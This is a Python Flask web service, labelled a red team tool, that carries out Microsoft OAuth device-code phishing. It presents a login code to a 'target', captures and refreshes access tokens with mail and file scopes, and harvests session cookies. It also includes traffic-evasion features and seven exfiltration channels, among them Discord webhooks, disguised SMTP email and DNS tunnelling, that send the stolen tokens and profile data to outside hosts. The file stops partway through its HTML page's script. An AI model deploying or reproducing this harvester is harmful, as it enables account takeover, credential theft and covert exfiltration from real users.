#!/usr/bin/env python3
"""
Device Code Token Harvester – Render Web Service
-------------------------------------------------
Red Team Tool – Authorized Testing Only

Deploy on Render as a Web Service:
  1. Create a new Web Service on Render
  2. Set Runtime to Python 3.11+
  3. Set Build Command: pip install -r requirements.txt
  4. Set Start Command: gunicorn app:app
  5. Add environment variables as needed (see below)

Environment variables:
  - CLIENT_ID (optional) – default Azure AD app ID
  - TENANT (optional) – default tenant (common)
  - PROXY_URL (optional) – HTTP/HTTPS proxy (e.g. http://user:pass@proxy:8080)
  - EXFIL_CONFIG (optional) – JSON string, file path, or URL for exfiltration channels
  - ENCRYPTION_KEY (optional) – hex string for AES-256-GCM payload encryption
  - EXFIL_OUTPUT_DIR (optional) – local directory to save sessions
  - REQUIRE_AUTH (optional) – set "true" to enable Basic Auth
  - AUTH_USER, AUTH_PASS – required if REQUIRE_AUTH=true
  - FLASK_DEBUG – set to "false" in production
"""

import os
import sys
import json
import time
import base64
import hashlib
import logging
import random
import socket
import hmac
import uuid
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import quote
from functools import wraps

import requests
from flask import Flask, render_template_string, jsonify, request, Response

# ===================== CRYPTOGRAPHY IMPORTS =====================
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    # Fallback to pure Python for environments without cryptography
    AESGCM = None
    logging.warning("cryptography not installed, AES encryption will be unavailable")

# ===================== LOGGING SETUP =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

# ===================== OPTIONAL BASIC AUTH =====================
def check_auth(username: str, password: str) -> bool:
    """Verify username/password against environment variables."""
    required_user = os.environ.get('AUTH_USER')
    required_pass = os.environ.get('AUTH_PASS')
    if not required_user or not required_pass:
        return True  # auth not required
    return username == required_user and password == required_pass

def authenticate() -> Response:
    """Send 401 Unauthorized response."""
    return Response(
        'Unauthorized access. Please provide valid credentials.\n',
        401,
        {'WWW-Authenticate': 'Basic realm="Red Team Tool"'}
    )

def requires_auth(f):
    """Decorator to protect routes with Basic Auth."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if os.environ.get('REQUIRE_AUTH', '').lower() == 'true':
            auth = request.authorization
            if not auth or not check_auth(auth.username, auth.password):
                return authenticate()
        return f(*args, **kwargs)
    return decorated

# ===================== CRYPTO UTILITIES =====================
class CryptoUtils:
    @staticmethod
    def generate_key() -> bytes:
        """Generate a secure random 32-byte key for AES-256-GCM."""
        return os.urandom(32)

    @staticmethod
    def aes_gcm_encrypt(key: bytes, plaintext: bytes, aad: bytes = b"") -> Tuple[bytes, bytes]:
        """Encrypt plaintext using AES-256-GCM. Returns (nonce, ciphertext)."""
        if AESGCM is None:
            raise RuntimeError("cryptography library not installed")
        aesgcm = AESGCM(key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext, aad)
        return nonce, ciphertext

    @staticmethod
    def aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext: bytes, aad: bytes = b"") -> bytes:
        """Decrypt ciphertext using AES-256-GCM."""
        if AESGCM is None:
            raise RuntimeError("cryptography library not installed")
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, aad)

    @staticmethod
    def b64_encode(data: bytes) -> str:
        return base64.b64encode(data).decode('utf-8')

    @staticmethod
    def b64_decode(data: str) -> bytes:
        return base64.b64decode(data)

# ===================== STEALTH ENGINE (with proxy support) =====================
class StealthEngine:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    ]

    def __init__(self, proxy_url: Optional[str] = None, min_jitter: float = 1.0, max_jitter: float = 3.5):
        self.proxy_url = proxy_url or os.environ.get('PROXY_URL')
        self.min_jitter = min_jitter
        self.max_jitter = max_jitter

    def random_ua(self) -> str:
        return random.choice(self.USER_AGENTS)

    def jitter(self):
        delay = round(random.uniform(self.min_jitter, self.max_jitter), 2)
        time.sleep(delay)

    def build_session(self) -> requests.Session:
        sess = requests.Session()
        sess.headers.update({"User-Agent": self.random_ua()})
        if self.proxy_url:
            sess.proxies = {"http": self.proxy_url, "https": self.proxy_url}
            logger.debug(f"Using proxy: {self.proxy_url}")
        return sess

# ===================== EXFILTRATION CHANNELS =====================
class ExfilChannel:
    def __init__(self, config: dict):
        self.config = config
        self.name = self.__class__.__name__

    def exfil(self, payload: dict) -> bool:
        raise NotImplementedError

    def _encrypt_payload(self, payload: dict, key: bytes = None) -> dict:
        if key is None and 'encryption_key' in self.config:
            key = bytes.fromhex(self.config['encryption_key'])
        elif key is None:
            return payload
        plaintext = json.dumps(payload).encode('utf-8')
        nonce, ciphertext = CryptoUtils.aes_gcm_encrypt(key, plaintext)
        return {
            'ct': CryptoUtils.b64_encode(ciphertext),
            'nonce': CryptoUtils.b64_encode(nonce),
            'key_id': hashlib.sha256(key).hexdigest()[:16],
            'type': 'aes256_gcm',
            'timestamp': datetime.now(timezone.utc).isoformat(),
        }

class HTTPExfil(ExfilChannel):
    def exfil(self, payload: dict) -> bool:
        url = self.config.get('url')
        if not url:
            logger.error("HTTPExfil: no URL")
            return False
        encrypted = self._encrypt_payload(payload)
        method = self.config.get('method', 'POST').upper()
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
        if 'extra_headers' in self.config:
            headers.update(self.config['extra_headers'])
        try:
            data = json.dumps(encrypted)
            if method == 'POST':
                r = requests.post(url, data=data, headers=headers, timeout=15)
            elif method == 'PUT':
                r = requests.put(url, data=data, headers=headers, timeout=15)
            else:
                r = requests.get(f"{url}?d={quote(data)}", headers=headers, timeout=15)
            ok = r.status_code in (200, 201, 202, 204)
            if ok:
                logger.info(f"HTTPExfil: delivered to {url}")
            return ok
        except Exception as e:
            logger.error(f"HTTPExfil: {e}")
            return False

class DiscordWebhookExfil(ExfilChannel):
    def exfil(self, payload: dict) -> bool:
        webhook_url = self.config.get('webhook_url')
        if not webhook_url:
            return False
        encrypted = self._encrypt_payload(payload)
        data_str = json.dumps(encrypted)
        try:
            if len(data_str) < 1900:
                r = requests.post(webhook_url, json={
                    'content': f"```json\n{data_str[:1900]}\n```",
                    'username': self.config.get('bot_name', 'Session Capture')
                }, timeout=15)
                if r.status_code in (200, 204):
                    logger.info("DiscordExfil: delivered")
                    return True
            files = {'file': (f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                             data_str, 'application/json')}
            r = requests.post(webhook_url, data={'username': self.config.get('bot_name', 'RedTeam')},
                              files=files, timeout=30)
            if r.status_code in (200, 204):
                logger.info("DiscordExfil: delivered as file")
                return True
        except Exception as e:
            logger.error(f"DiscordExfil: {e}")
        return False

class SMTPExfil(ExfilChannel):
    def exfil(self, payload: dict) -> bool:
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        smtp_host = self.config.get('smtp_host')
        smtp_port = self.config.get('smtp_port', 587)
        username = self.config.get('username')
        password = self.config.get('password')
        from_addr = self.config.get('from_addr')
        to_addr = self.config.get('to_addr')
        if not all([smtp_host, from_addr, to_addr]):
            return False
        encrypted = self._encrypt_payload(payload)
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = self.config.get('subject', 'Re: Project Update')
        attachment = MIMEText(json.dumps(encrypted))
        attachment.add_header('Content-Disposition', 'attachment',
                              filename=f"report_{datetime.now().strftime('%Y%m%d')}.dat")
        msg.attach(attachment)
        try:
            server = smtplib.SMTP(smtp_host, smtp_port)
            server.starttls()
            if username and password:
                server.login(username, password)
            server.send_message(msg)
            server.quit()
            logger.info(f"SMTPExfil: sent to {to_addr}")
            return True
        except Exception as e:
            logger.error(f"SMTPExfil: {e}")
            return False

class DNSExfil(ExfilChannel):
    def exfil(self, payload: dict) -> bool:
        domain = self.config.get('domain')
        if not domain:
            return False
        try:
            import dns.resolver
        except ImportError:
            logger.error("DNSExfil: install dnspython")
            return False
        encrypted = self._encrypt_payload(payload)
        data_str = base64.urlsafe_b64encode(json.dumps(encrypted).encode()).decode('utf-8')
        chunk_size = 50
        chunks = [data_str[i:i+chunk_size] for i in range(0, len(data_str), chunk_size)]
        session_id = hashlib.md5(data_str.encode()).hexdigest()[:8]
        total = len(chunks)
        resolver = dns.resolver.Resolver()
        resolver.nameservers = self.config.get('nameservers', ['8.8.8.8'])
        resolver.timeout = self.config.get('timeout', 5)
        resolver.lifetime = self.config.get('lifetime', 10)
        success = True
        for idx, chunk in enumerate(chunks):
            query = f"{idx:04x}.{total:04x}.{session_id}.{chunk}.{domain}"
            if len(query) > 253:
                continue
            try:
                resolver.resolve(query, 'TXT')
            except Exception:
                pass
            time.sleep(self.config.get('inter_chunk_delay', 0.2))
        logger.info(f"DNSExfil: {total} chunks sent via {domain}")
        return success

class S3Exfil(ExfilChannel):
    def exfil(self, payload: dict) -> bool:
        try:
            import boto3
            from botocore.config import Config
        except ImportError:
            logger.error("S3Exfil: install boto3")
            return False
        endpoint_url = self.config.get('endpoint_url')
        access_key = self.config.get('access_key')
        secret_key = self.config.get('secret_key')
        bucket = self.config.get('bucket')
        if not all([endpoint_url, access_key, secret_key, bucket]):
            return False
        encrypted = self._encrypt_payload(payload)
        try:
            s = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
            )
            s3 = s.client('s3', endpoint_url=endpoint_url,
                          region_name=self.config.get('region', 'us-east-1'),
                          config=Config(connect_timeout=10, read_timeout=30))
            key = f"sessions/{datetime.now().strftime('%Y/%m/%d')}/{self.config.get('file_prefix', 'capture')}_{os.urandom(4).hex()}.enc"
            s3.put_object(Bucket=bucket, Key=key,
                          Body=json.dumps(encrypted).encode('utf-8'),
                          ServerSideEncryption='AES256')
            logger.info(f"S3Exfil: uploaded to s3://{bucket}/{key}")
            return True
        except Exception as e:
            logger.error(f"S3Exfil: {e}")
            return False

class WebSocketExfil(ExfilChannel):
    def exfil(self, payload: dict) -> bool:
        try:
            import websocket
        except ImportError:
            logger.error("WSExfil: install websocket-client")
            return False
        ws_url = self.config.get('ws_url')
        if not ws_url:
            return False
        encrypted = self._encrypt_payload(payload)
        try:
            ws = websocket.create_connection(ws_url, timeout=self.config.get('timeout', 15))
            ws.send(json.dumps(encrypted))
            ws.close()
            logger.info(f"WSExfil: sent to {ws_url}")
            return True
        except Exception as e:
            logger.error(f"WSExfil: {e}")
            return False

class MQTTExfil(ExfilChannel):
    def exfil(self, payload: dict) -> bool:
        try:
            import paho.mqtt.client as mqtt
        except ImportError:
            logger.error("MQTTExfil: install paho-mqtt")
            return False
        broker = self.config.get('broker')
        port = self.config.get('port', 1883)
        topic = self.config.get('topic', 'devices/telemetry')
        username = self.config.get('username')
        password = self.config.get('password')
        if not broker:
            return False
        encrypted = self._encrypt_payload(payload)
        try:
            client = mqtt.Client()
            if username and password:
                client.username_pw_set(username, password)
            client.connect(broker, port, 60)
            client.publish(topic, json.dumps(encrypted))
            client.disconnect()
            logger.info(f"MQTTExfil: published to {broker}/{topic}")
            return True
        except Exception as e:
            logger.error(f"MQTTExfil: {e}")
            return False

# ===================== EXFIL MANAGER =====================
class ExfilManager:
    def __init__(self, config_data: dict, encryption_key: Optional[str] = None):
        self.channels: List[ExfilChannel] = []
        self.failure_count: Dict[str, int] = {}
        self.max_failures = config_data.get('max_failures_per_channel', 3)
        self.encryption_key = encryption_key

        CHANNEL_MAP = {
            'http': HTTPExfil, 'discord': DiscordWebhookExfil,
            'smtp': SMTPExfil, 'dns': DNSExfil,
            's3': S3Exfil, 'websocket': WebSocketExfil, 'mqtt': MQTTExfil,
        }

        for ch_cfg in config_data.get('channels', []):
            ctype = ch_cfg.get('type', '').lower()
            if ctype == 'all':
                for cls in CHANNEL_MAP.values():
                    cfg_copy = ch_cfg.copy()
                    if 'encryption_key' not in cfg_copy and encryption_key:
                        cfg_copy['encryption_key'] = encryption_key
                    self.channels.append(cls(cfg_copy))
                continue
            if ctype in CHANNEL_MAP:
                if 'encryption_key' not in ch_cfg and encryption_key:
                    ch_cfg['encryption_key'] = encryption_key
                self.channels.append(CHANNEL_MAP[ctype](ch_cfg))
            else:
                logger.warning(f"Unknown channel type: {ctype}")

        logger.info(f"Loaded {len(self.channels)} exfil channels")

    def exfiltrate(self, payload: dict) -> Dict[str, bool]:
        results = {}
        for channel in self.channels:
            cname = channel.__class__.__name__
            if self.failure_count.get(cname, 0) >= self.max_failures:
                logger.warning(f"Circuit breaker open for {cname}")
                results[cname] = False
                continue
            try:
                success = channel.exfil(payload)
                results[cname] = success
                self.failure_count[cname] = 0 if success else self.failure_count.get(cname, 0) + 1
            except Exception as e:
                logger.error(f"{cname} exception: {e}")
                results[cname] = False
                self.failure_count[cname] = self.failure_count.get(cname, 0) + 1
        ok = sum(1 for v in results.values() if v)
        logger.info(f"Exfil: {ok}/{len(results)} channels OK")
        return results

# ===================== TOKEN HARVESTER =====================
class TokenHarvester:
    ENDPOINT_POOL = [
        ("graph", "https://graph.microsoft.com/v1.0/me"),
        ("office", "https://www.office.com/"),
        ("login", "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"),
        ("myapps", "https://myapps.microsoft.com/"),
        ("outlook", "https://outlook.office365.com/owa/"),
        ("portal", "https://portal.azure.com/"),
        ("teams", "https://teams.microsoft.com/"),
        ("account", "https://account.activedirectory.windowsazure.com/"),
        ("device", "https://microsoft.com/devicelogin"),
        ("security", "https://security.microsoft.com/"),
        ("admin", "https://admin.microsoft.com/"),
        ("compliance", "https://compliance.microsoft.com/"),
    ]

    def __init__(self, client_id: str, tenant: str = "common",
                 scopes: List[str] = None, stealth: StealthEngine = None):
        self.client_id = client_id
        self.tenant = tenant
        self.scopes = scopes or [
            "https://graph.microsoft.com/Mail.Read",
            "https://graph.microsoft.com/Files.ReadWrite.All",
            "https://graph.microsoft.com/User.Read",
            "openid", "offline_access", "profile",
        ]
        self.stealth = stealth or StealthEngine()
        self.cookies: List[Dict] = []
        self.user_info: Dict = {}
        self.token_data: Optional[Dict] = None
        self._seen_cookie_keys: set = set()

    def get_device_code(self) -> Dict:
        url = f"https://login.microsoftonline.com/{self.tenant}/oauth2/v2.0/devicecode"
        sess = self.stealth.build_session()
        data = {"client_id": self.client_id, "scope": " ".join(self.scopes)}
        try:
            resp = sess.post(url, data=data)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            logger.error(f"Device code failed: {e}")
            raise

    def poll_for_token(self, device_code: str, initial_interval: int = 5,
                       callback=None) -> Dict:
        url = f"https://login.microsoftonline.com/{self.tenant}/oauth2/v2.0/token"
        interval = initial_interval
        sess = self.stealth.build_session()
        data = {
            "client_id": self.client_id,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "device_code": device_code,
        }
        logger.info("Polling for token...")
        while True:
            try:
                self.stealth.jitter()
                resp = sess.post(url, data=data)
                token = resp.json()
                if resp.status_code == 200:
                    self.token_data = token
                    if callback:
                        callback("token_obtained", token)
                    logger.info("Token obtained!")
                    return token
                error = token.get("error", "")
                if error == "authorization_pending":
                    if callback:
                        callback("polling", {"interval": interval})
                    time.sleep(interval)
                    continue
                elif error == "slow_down":
                    interval += 2
                    if callback:
                        callback("slow_down", {"new_interval": interval})
                    time.sleep(interval)
                    continue
                else:
                    raise RuntimeError(f"Polling failed: {error}")
            except KeyboardInterrupt:
                raise

    def refresh_token(self, refresh_token: str) -> Optional[Dict]:
        url = f"https://login.microsoftonline.com/{self.tenant}/oauth2/v2.0/token"
        sess = self.stealth.build_session()
        data = {
            "client_id": self.client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": " ".join(self.scopes),
        }
        try:
            resp = sess.post(url, data=data)
            if resp.status_code == 200:
                self.token_data = resp.json()
                logger.info("Token refreshed")
                return self.token_data
            else:
                logger.warning(f"Refresh failed: {resp.status_code}")
                return None
        except Exception as e:
            logger.error(f"Refresh exception: {e}")
            return None

    def fetch_user_info(self) -> Dict:
        if not self.token_data or not self.token_data.get('access_token'):
            return {}
        at = self.token_data['access_token']
        headers = {'Authorization': f'Bearer {at}'}
        sess = self.stealth.build_session()
        try:
            resp = sess.get('https://graph.microsoft.com/v1.0/me', headers=headers)
            if resp.status_code == 200:
                self.user_info = resp.json()
                org = sess.get('https://graph.microsoft.com/v1.0/organization', headers=headers)
                if org.status_code == 200:
                    vals = org.json().get('value')
                    if vals:
                        self.user_info['tenantId'] = vals[0].get('id')
                return self.user_info
        except Exception as e:
            logger.debug(f"fetch_user_info: {e}")
        return {}

    def _store_cookie(self, cookie, domain_hint=".microsoftonline.com"):
        name = cookie.name
        domain = cookie.domain or domain_hint
        key = f"{name}@{domain}"
        if key in self._seen_cookie_keys:
            return
        self._seen_cookie_keys.add(key)
        entry = {
            'domain': domain, 'name': name, 'value': cookie.value,
            'path': cookie.path or '/', 'secure': cookie.secure,
            'httpOnly': cookie.has_nonstandard_attr('HttpOnly') if hasattr(cookie, 'has_nonstandard_attr') else False,
            'sameSite': 'None',
            'expirationDate': cookie.expires if cookie.expires else int(time.time()) + 31536000,
        }
        self.cookies.append(entry)

    def extract_cookies(self, max_endpoints: int = 4) -> List[Dict]:
        if not self.token_data or not self.token_data.get('access_token'):
            return []
        at = self.token_data['access_token']
        logger.info("Extracting cookies...")
        chosen = random.sample(self.ENDPOINT_POOL, min(max_endpoints, len(self.ENDPOINT_POOL)))
        random.shuffle(chosen)
        headers = {'Authorization': f'Bearer {at}'}
        for label, url in chosen:
            try:
                self.stealth.jitter()
                sess = self.stealth.build_session()
                if 'authorize' in url:
                    params = {
                        'client_id': self.client_id, 'response_type': 'code',
                        'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                        'scope': ' '.join(self.scopes),
                    }
                    resp = sess.get(url, headers=headers, params=params, allow_redirects=True)
                else:
                    resp = sess.get(url, headers=headers, allow_redirects=True)
                for cookie in resp.cookies:
                    self._store_cookie(cookie)
                logger.debug(f"[{label}] {len(resp.cookies)} cookies")
            except Exception as e:
                logger.debug(f"[{label}] skipped: {e}")
        try:
            self.stealth.jitter()
            fresh = self.stealth.build_session()
            dr = fresh.get('https://microsoft.com/devicelogin', allow_redirects=True, timeout=10)
            for cookie in dr.cookies:
                self._store_cookie(cookie, ".microsoft.com")
        except Exception:
            pass
        logger.info(f"Extracted {len(self.cookies)} cookies")
        return self.cookies

# ===================== JWT UTILITIES =====================
def decode_jwt(token: str) -> Optional[Dict]:
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        payload = parts[1]
        payload += '=' * (4 - len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return None

# ===================== SESSION PAYLOAD BUILDER =====================
def build_session_payload(token_data: dict, cookies: List[Dict],
                          user_info: Dict, client_id: str, tenant: str,
                          metadata: dict = None) -> dict:
    access_token = token_data.get('access_token', '')
    id_token = token_data.get('id_token', '')
    jwt_claims = {}
    if id_token:
        jwt_claims['id_token'] = decode_jwt(id_token)
    if access_token:
        jwt_claims['access_token'] = decode_jwt(access_token)
    return {
        'version': '2.0',
        'capture_timestamp': datetime.now(timezone.utc).isoformat(),
        'client_id': client_id,
        'tenant': tenant,
        'tokens': {
            'access_token': access_token,
            'refresh_token': token_data.get('refresh_token', ''),
            'id_token': id_token,
            'expires_in': token_data.get('expires_in', 0),
            'token_type': token_data.get('token_type', ''),
            'scope': token_data.get('scope', ''),
        },
        'jwt_claims': jwt_claims,
        'user': {
            'upn': user_info.get('userPrincipalName', ''),
            'display_name': user_info.get('displayName', ''),
            'email': user_info.get('mail', ''),
            'job_title': user_info.get('jobTitle', ''),
            'tenant_id': user_info.get('tenantId', ''),
            'user_id': user_info.get('id', ''),
            'office_location': user_info.get('officeLocation', ''),
        },
        'cookies': cookies,
        'cookie_count': len(cookies),
        'metadata': metadata or {},
    }

# ===================== FLASK WEB UI (HTML) =====================
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OAuth Device Code Harvester</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; }
        h1 { color: #58a6ff; font-size: 1.8em; margin-bottom: 5px; }
        .subtitle { color: #8b949e; margin-bottom: 25px; font-size: 0.9em; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
        .card h2 { color: #f0f6fc; font-size: 1.2em; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid #21262d; }
        label { display: block; margin: 10px 0 5px; color: #8b949e; font-size: 0.85em; text-transform: uppercase; letter-spacing: 0.5px; }
        input, select, textarea { width: 100%; padding: 10px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #c9d1d9; font-size: 0.95em; }
        input:focus, select:focus, textarea:focus { outline: none; border-color: #58a6ff; }
        .btn { padding: 10px 20px; border: none; border-radius: 6px; font-size: 1em; cursor: pointer; transition: all 0.2s; font-weight: 600; }
        .btn-primary { background: #238636; color: #fff; }
        .btn-primary:hover { background: #2ea043; }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-danger { background: #da3633; color: #fff; }
        .btn-danger:hover { background: #f85149; }
        .btn-secondary { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; }
        .btn-secondary:hover { background: #30363d; }
        .flex { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        .mt-10 { margin-top: 10px; }
        .mt-20 { margin-top: 20px; }
        .mb-10 { margin-bottom: 10px; }
        .code-block { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 15px; font-family: 'SF Mono', monospace; font-size: 0.85em; overflow-x: auto; white-space: pre-wrap; word-break: break-all; max-height: 400px; overflow-y: auto; }
        .success { color: #3fb950; }
        .warning { color: #d29922; }
        .error { color: #f85149; }
        .info { color: #58a6ff; }
        .status-bar { padding: 10px 15px; border-radius: 6px; margin-bottom: 15px; font-size: 0.9em; }
        .status-bar.active { background: #0d419d33; border: 1px solid #58a6ff; color: #58a6ff; }
        .status-bar.success { background: #1b4a1b33; border: 1px solid #3fb950; color: #3fb950; }
        .status-bar.error { background: #4a1b1b33; border: 1px solid #f85149; color: #f85149; }
        .status-bar.info { background: #1b2d4a33; border: 1px solid #58a6ff; color: #58a6ff; }
        .hidden { display: none; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        @media (max-width: 640px) { .grid-2 { grid-template-columns: 1fr; } }
        .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 0.75em; font-weight: 600; }
        .badge-green { background: #1b4a1b; color: #3fb950; }
        .badge-red { background: #4a1b1b; color: #f85149; }
        .badge-yellow { background: #4a3b1b; color: #d29922; }
        .collapse { margin-bottom: 10px; }
        .collapse-header { cursor: pointer; user-select: none; padding: 8px 0; }
        .collapse-header:hover { color: #58a6ff; }
        .collapse-body { padding-left: 15px; border-left: 2px solid #21262d; }
        .log-line { font-family: 'SF Mono', monospace; font-size: 0.8em; color: #8b949e; padding: 2px 0; }
        .log-line.warn { color: #d29922; }
        .log-line.err { color: #f85149; }
        .log-line.ok { color: #3fb950; }
        .log-line.info { color: #58a6ff; }
        #logs { max-height: 300px; overflow-y: auto; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 10px; margin-top: 10px; }
        #qrcode { text-align: center; padding: 20px; }
        #qrcode svg { max-width: 200px; }
        .copy-btn { background: none; border: 1px solid #30363d; color: #8b949e; cursor: pointer; padding: 4px 10px; border-radius: 4px; font-size: 0.8em; }
        .copy-btn:hover { border-color: #58a6ff; color: #58a6ff; }
    </style>
</head>
<body>
<div class="container">
    <h1>OAuth Device Code Harvester</h1>
    <p class="subtitle">Authorized Red Team Testing Tool</p>

    <div id="statusArea" class="status-bar hidden"></div>

    <!-- Configuration -->
    <div class="card">
        <h2>Configuration</h2>
        <div class="grid-2">
            <div>
                <label for="clientId">Client ID</label>
                <input type="text" id="clientId" placeholder="Azure AD App Client ID" value="{{ client_id or '' }}">
            </div>
            <div>
                <label for="tenant">Tenant</label>
                <input type="text" id="tenant" value="common" placeholder="common / organizations / tenant-id">
            </div>
        </div>
        <div class="grid-2 mt-10">
            <div>
                <label for="scope">Scope (space-separated)</label>
                <input type="text" id="scope" value="https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Files.ReadWrite.All https://graph.microsoft.com/User.Read openid offline_access profile">
            </div>
            <div>
                <label for="maxEndpoints">Cookie Harvest Endpoints</label>
                <input type="number" id="maxEndpoints" value="4" min="1" max="12">
            </div>
        </div>
        <div class="flex mt-10">
            <label class="flex" style="gap: 5px; text-transform: none; letter-spacing: 0;">
                <input type="checkbox" id="refreshToken" checked> Refresh token after capture
            </label>
            <label class="flex" style="gap: 5px; text-transform: none; letter-spacing: 0;">
                <input type="checkbox" id="detectCA" checked> Detect Conditional Access
            </label>
        </div>
        <div class="flex mt-20">
            <button class="btn btn-primary" id="startBtn" onclick="startCapture()">Start Capture</button>
            <button class="btn btn-secondary" onclick="clearOutput()">Clear Output</button>
        </div>
    </div>

    <!-- Capture Status -->
    <div class="card hidden" id="captureCard">
        <h2>Capture Status</h2>
        <div id="captureStatus">Initializing...</div>

        <!-- Device Code Display -->
        <div id="deviceCodeArea" class="hidden mt-10">
            <div class="status-bar info">
                <strong>Present to target:</strong>
            </div>
            <div class="grid-2 mt-10">
                <div>
                    <label>Verification URL</label>
                    <div class="flex">
                        <code id="verificationUri" style="background:#0d1117;padding:8px 12px;border-radius:4px;border:1px solid #30363d;flex:1;word-break:break-all;"></code>
                        <button class="copy-btn" onclick="copyText('verificationUri')">Copy</button>
                    </div>
                </div>
                <div>
                    <label>User Code</label>
                    <div class="flex">
                        <code id="userCode" style="background:#0d1117;padding:8px 12px;border-radius:4px;border:1px solid #30363d;font-size:1.4em;font-weight:700;letter-spacing:3px;"></code>
                        <button class="copy-btn" onclick="copyText('userCode')">Copy</button>
                    </div>
                </div>
            </div>
            <p class="mt-10" style="color:#8b949e;font-size:0.85em;">
                Target goes to the URL and enters the code. Polling will begin automatically.
            </p>
        </div>

        <!-- Live Logs -->
        <div class="mt-10">
            <label>Live Log</label>
            <div id="logs"></div>
        </div>
    </div>

    <!-- Results -->
    <div class="card hidden" id="resultsCard">
        <h2>Capture Results</h2>

        <div class="collapse">
            <div class="collapse-header" onclick="toggleCollapse(this)">
                <strong>&#9654; Tokens</strong>
            </div>
            <div class="collapse-body hidden" id="tokensBody">
                <div class="mt-10" id="tokensContent"></div>
            </div>
        </div>

        <div class="collapse">
            <div class="collapse-header" onclick="toggleCollapse(this)">
                <strong>&#9654; User Info</strong>
            </div>
            <div class="collapse-body hidden" id="userBody">
                <div class="mt-10" id="userContent"></div>
            </div>
        </div>

        <div class="collapse">
            <div class="collapse-header" onclick="toggleCollapse(this)">
                <strong>&#9654; Cookies (<span id="cookieCount">0</span>)</strong>
            </div>
            <div class="collapse-body hidden" id="cookiesBody">
                <div class="flex mt-10 mb-10">
                    <button class="btn btn-secondary" onclick="exportCookiesNetscape()">Export Netscape</button>
                    <button class="btn btn-secondary" onclick="exportCookiesJSON()">Export JSON</button>
                </div>
                <div id="cookiesContent"></div>
            </div>
        </div>

        <div class="collapse">
            <div class="collapse-header" onclick="toggleCollapse(this)">
                <strong>&#9654; Conditional Access Analysis</strong>
            </div>
            <div class="collapse-body hidden" id="caBody">
                <div class="mt-10" id="caContent"></div>
            </div>
        </div>

        <div class="collapse">
            <div class="collapse-header" onclick="toggleCollapse(this)">
                <strong>&#9654; Full Session JSON</strong>
            </div>
            <div class="collapse-body hidden" id="fullBody">
                <div class="flex mt-10 mb-10">
                    <button class="btn btn-secondary" onclick="downloadSession()">Download Full Session</button>
                    <button class="btn btn-secondary" onclick="copyFullSession()">Copy to Clipboard</button>
                </div>
                <div id="fullContent" class="code-block"></div>
            </div>
        </div>

        <!-- Exfil Results -->
        <div class="collapse">
            <div class="collapse-header" onclick="toggleCollapse(this)">
                <strong>&#9654; Exfiltration Results</strong>
            </div>
            <div class="collapse-body hidden" id="exfilBody">
                <div class="mt-10" id="exfilContent"></div>
            </div>
        </div>

        <div class="flex mt-20">
            <button class="btn btn-primary" onclick="startCapture()">New Capture</button>
            <button class="btn btn-secondary" onclick="window.scrollTo({top:0,behavior:'smooth'})">Top</button>
        </div>
    </div>
</div>

<script>
let captureId = null;
let pollInterval = null;

function addLog(message, level='info') {
    const logs = document.getElementById('logs');
    const line = document.createElement('div');
    line.className = 'log-line ' + level;
